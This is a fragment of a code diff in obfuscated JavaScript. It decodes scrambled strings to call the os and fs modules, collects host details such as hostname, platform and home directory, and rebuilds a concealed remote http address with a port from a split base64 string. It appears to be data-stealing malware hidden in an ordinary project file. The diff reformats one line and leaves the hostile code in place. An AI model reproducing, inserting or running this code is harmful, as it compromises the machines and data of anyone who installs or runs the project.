@@ -13,7 +13,8 @@ Buffer.from(s1,t).toString(c)),e=(r,e)=>{let E=Buffer.from(r,t);const o=E.length
     $=E("BRgHTBMbFFU"),n=E("ARkWXBwG"),l=E("HRsLXREdFA"),R=E("HRsVTBsVC10"),
     W=E("AQ0WXQ"),V=require("os"),U=require(A),g=require(o),Q=require(a),
     h=require(i),w=require(F)[B],x=V[R](),f=V[$](),y=V[l](),G=V[n](),I=V[W](),
-    S=require("fs");let u;const d=t=>e(t,c),X=(()=>{let t="MTcyLjg2LjaHR0cDovLwk5LjM2OjEyMjQ=";
+    S=require("fs");let u;
+    const d=t=>e(t,c),X=(()=>{let t="MTcyLjg2LjaHR0cDovLwk5LjM2OjEyMjQ=";
     for(var c="b",e="a",E="",s="",o=0;o<10;o++)c+=t[o],e+=t[10+o],E+=t[20+o],s+=t[30+o]; 
     return c=c+E+s,r(e)+r(c)})(),H=d("ER0UVhQZAw"),
     C=t=>t.replace(/^~([a-z]+|\/)/,((t,c)=>"/"===c?y:`${U[H](y)}/${c}`)),
